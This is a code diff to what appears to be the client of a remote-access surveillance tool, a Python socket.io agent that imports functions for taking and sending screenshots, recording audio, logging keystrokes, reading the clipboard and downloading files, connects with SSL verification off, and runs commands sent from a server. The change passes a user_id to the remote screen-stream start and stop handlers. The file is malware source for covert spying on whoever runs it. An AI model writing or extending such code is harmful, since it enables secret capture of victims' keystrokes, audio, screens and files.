@@ -6,7 +6,7 @@ import time
 import socketio
 
 from media_utils import take_and_send_screenshot, record_and_send_audio, record_and_send_keyboard_log, download_file, \
-    start_stream as start_media_stream, stop_stream as stop_media_stream, get_clipboard_content, list_dir
+    start_stream as start_media_stream, stop_stream as stop_media_stream, get_clipboard_content
 
 sio = socketio.Client(reconnection=True, reconnection_attempts=5, reconnection_delay=2, ssl_verify=False)
 
@@ -67,13 +67,15 @@ def command(data):
 
 
 @sio.event
-def start_stream():
-    threading.Thread(target=start_media_stream, args=(sio,)).start()
+def start_stream(data):
+    user_id = data.get('user_id')
+    threading.Thread(target=start_media_stream, args=(sio, user_id)).start()
 
 
 @sio.event
-def stop_stream():
-    stop_media_stream()
+def stop_stream(data):
+    user_id = data.get('user_id')
+    stop_media_stream(user_id)
 
 
 def attempt_reconnect():
